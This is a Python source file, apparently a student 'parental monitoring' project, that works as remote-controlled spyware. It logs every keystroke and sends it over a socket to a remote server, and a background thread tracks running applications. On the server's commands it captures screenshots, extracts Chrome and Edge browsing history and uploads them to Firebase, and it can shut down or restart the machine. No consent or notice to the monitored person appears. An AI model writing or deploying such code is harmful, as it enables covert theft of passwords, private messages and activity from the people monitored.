import sqlite3
import threading
from pynput.keyboard import Listener
import socket
import pyautogui
from datetime import datetime, timedelta
import time
import os
import psutil
import firebase_admin
from firebase_admin import credentials, storage, db

cred = credentials.Certificate("credentials.json")
firebase_admin.initialize_app(cred, {
    "storageBucket": "pbl4-09092003.appspot.com",
    "databaseURL": "https://pbl4-09092003-default-rtdb.firebaseio.com"
    })
ref = db.reference('history')


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverParent = '192.168.1.5'
serverPort = 8080


try:
    clientSocket.connect((serverParent, serverPort))
except Exception as e:
    print("Error connecting to server:", str(e))
if clientSocket:
    print("connecting to server")

def convert_time(timestamp):
    epoch_start = datetime(1601, 1, 1)
    dt_object = epoch_start + timedelta(microseconds=timestamp)
    return dt_object.strftime("%Y-%m-%d %H:%M:%S")

def on_press(key):
    try:
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

def takeScreenshot():
    now = datetime.now()
    nameScreen = "screenshot-" + now.strftime("%Y%m%d-%H%M%S") + ".png"
    print("Name Screen: ", nameScreen)
    try:
        screenshot = pyautogui.screenshot()
        if screenshot:
            print("successfully taken screenshot")
        else:
            print("Failed to take screenshot")
        screenshot.save(nameScreen)
        
        # Lưu ảnh vào Firebase Storage
        bucket = storage.bucket()
        
        destination = 'images/' + nameScreen
        blob = bucket.blob(destination)
        blob.upload_from_filename(nameScreen)
        
        # Gửi link ảnh public  đến server
        # link = blob.public_url
        link = blob.generate_signed_url(expiration= int(time.time()) + 3600) 
        print("Link: ",  link)
        clientSocket.send(link.encode('utf-8'))
        
    except Exception as e:
        print("Error: " + str(e))

def getAppHistory():
    
    # Danh sách lưu trữ các ứng dụng hiện tại và thời điểm mở
    current_apps = {}

    # Lặp vô hạn
    while True:
        # Lấy danh sách các ứng dụng đang chạy
        running_apps = {process.name(): int(time.time()) for process in psutil.process_iter() if process.name().endswith('.exe')}
        
        # Tìm các ứng dụng mới xuất hiện và tính toán thời gian mở
        new_apps = {app: timestamp for app, timestamp in running_apps.items() if app not in current_apps}
        
        # Tìm các ứng dụng bị đóng lại và tính toán thời gian sử dụng
        for app in current_apps:
            if app not in running_apps:
                close_time = int(time.time())
                start_time = current_apps[app]['start-time']
                
                # Chuyển đổi start_time và close_time thành định dạng giờ-phút-giây
                start_time_datetime = datetime.fromtimestamp(start_time)
                close_time_datetime = datetime.fromtimestamp(close_time)
                
                formatted_start_time = convert_time(start_time_datetime)
                formatted_close_time = convert_time(close_time_datetime)
                
                usage_time = close_time - start_time
                print(f"Closed App: {app}, Usage Time: {usage_time} seconds")
                
                # Cập nhật thời gian mở, đóng và thời gian sử dụng vào Firebase
                current_date = time.strftime('%Y-%m-%d')
                date_ref = ref.child(current_date)
                app_ref = date_ref.child('app_history').push()
                
                app_ref.update({
                    'app_name': app,
                    'start-time': formatted_start_time,
                    'end-time': formatted_close_time,
                    'usage-time': usage_time
                })
        
        # Cập nhật danh sách các ứng dụng hiện tại và thời điểm mở
        current_apps = {app: {'start-time': timestamp} for app, timestamp in running_apps.items()}
        
        # Đẩy dữ liệu vào Firebase với ngày hiện tại
        current_date = time.strftime('%Y-%m-%d')
        date_ref = ref.child(current_date)
        
        # Ghi dữ liệu vào Firebase
        for app, timestamp in new_apps.items():
            app_ref = date_ref.child('app_history').push()
            app_ref.update({'app_name': app, 'start-time': timestamp})
        
        # Chờ 1 giây trước khi lặp lại để tránh tải nhiều tài nguyên hệ thống
        time.sleep(1)

def push_to_firebase(history_data, browser_type):
    # Lấy ngày hiện tại
    current_date = datetime.now().strftime("%Y-%m-%d")
    
    # Tham chiếu đến thư mục theo ngày trong Firebase
    date_ref = ref.child(current_date)

    # Tham chiếu đến thư mục của trình duyệt
    browser_ref = date_ref.child(f"{browser_type}History")
    
    # Đẩy dữ liệu lịch sử duyệt web lên Firebase
    browser_ref.set(history_data)


def get_Edge_history():        
    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"

    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()

    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = cursor.fetchall()

    browsing_history = []
    for row in results:
        url, title, last_visit_time = row
        formatted_time = convert_time(last_visit_time)
        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
        print(f"{formatted_time}: {title} - {url}")


    cursor.close()
    connection.close()

    # Đẩy dữ liệu lịch sử duyệt web Edge lên Firebase
    push_to_firebase(browsing_history, "Edge")

def get_Chrome_history():        
    db_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"

    connection = sqlite3.connect(db_path)
    cursor = connection.cursor()

    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = cursor.fetchall()

    browsing_history = []
    for row in results:
        url, title, last_visit_time = row
        formatted_time = convert_time(last_visit_time)
        browsing_history.append({"Time": formatted_time, "title": title, "url": url})
        print(f"{formatted_time}: {title} - {url}")


    cursor.close()
    connection.close()

    # Đẩy dữ liệu lịch sử duyệt web Chrome lên Firebase
    push_to_firebase(browsing_history, "Chrome")
           
with Listener(on_press=on_press) as parent:
    try:
        appHistory_thread = threading.Thread(target=getAppHistory)
        appHistory_thread.start()
        while True:
            message = clientSocket.recv(1024).decode('utf-8')
            print("Message:" + message)
            if message == 'takeScreenshot':
                takeScreenshot()
            elif message == 'ChromeHistory':
                get_Chrome_history()
            elif message == 'EdgeHistory':
                get_Edge_history()
            elif message == 'shutdown':
                os.system("shutdown /s /t 1")
            elif message == 'restart':
                os.system("shutdown /r /t 1")

    except Exception as e:
        print("Error: " + str(e))
    finally:
        parent.stop()
        parent.join()
        